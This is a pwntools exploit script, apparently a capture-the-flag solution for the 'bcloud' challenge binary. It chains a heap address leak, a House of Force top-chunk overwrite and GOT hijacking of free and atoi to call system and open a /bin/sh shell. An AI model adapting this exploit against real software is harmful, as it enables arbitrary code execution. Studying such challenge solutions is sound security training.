#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2018-08-13 23:29:22
# @Author  : giantbranch (giantbranch@gmail.com)
# @Link    : http://www.giantbranch.cn/
# @tags : 

from pwn import *
context.log_level = "debug"
p = process("./bcloud")
# p = process(['./bcloud'], env={"LD_PRELOAD":"./libc-2.19.so"})
elf  = ELF('./bcloud')
libc = ELF('./libc.so.6')


def getpid():
	print proc.pidof(p)[0]
	pause()
	

def newNote(length, content):
	p.recvuntil("option--->>\n")
	p.sendline("1")
	p.recvuntil("Input the length of the note content:\n")
	p.sendline(str(length))
	p.recvuntil("Input the content:\n")
	p.send(content)

def editNote(id, content):
	p.recvuntil("option--->>\n")
	p.sendline("3")
	p.recvuntil("Input the id:\n")
	p.sendline(str(id))
	p.recvuntil("Input the new content:\n")
	p.sendline(content)

noteLenArr = 0x0804B0A0

got_atoi = elf.got['atoi']
got_free = elf.got['free']
# because did't call in the program
plt_printf = elf.plt['printf']

# leak
p.recvuntil("Input your name:\n")
p.send("A" * 0x3c + "QQQQ")
p.recvuntil("QQQQ")
leak = p.recv(4)
first_heap_addr = u32(leak)
print "first_heap_addr: " + hex(first_heap_addr) 

# overwrite top chunk size
p.recvuntil("Org:\n")
p.send("B" * 0x40)
p.recvuntil("Host:\n")
p.sendline("\xff\xff\xff\xff")

#######
# change top chunk point
####### 
# first_heap_addr + 0xd0 is top chunk point
# malloc_addr = top chunk point + malloc_size 
# 0x8 size of header
malloc_size =  "-" +  str(-(noteLenArr - (first_heap_addr + 0xd0) - 0x8))
print "mysize: " + malloc_size
# size = (0xffffffff - first_heap_addr - 224) + noteLenArr - 4
# log.info("Size: " + hex(size)) 
# size = (0xffffffff ^ size) + 1
# print "last size: " + str(size)
newNote(malloc_size, "")

# write notearrary
payload = p32(4)
payload += p32(4)
payload += p32(4) * 29
payload += p32(got_free)
payload += p32(got_atoi)
payload += p32(got_atoi)
newNote(len(payload), payload)

# change got_free to plt_printf
editNote(1, p32(plt_printf))

# get atoi's address
p.recvuntil("option--->>\n")
p.sendline("4")
p.recvuntil("Input the id:\n")
p.sendline("2")
atoi_addr = u32(p.recv(4))
print "atoi_addr: " + hex(atoi_addr) 

# overwrite atoi with system
print "\ncalculating system() addr"
system_addr = atoi_addr - (libc.symbols['atoi'] - libc.symbols['system'])
print "system_addr = " + hex(system_addr)
pause()

editNote(3, p32(system_addr))

p.sendline("/bin/sh\x00")

p.interactive()
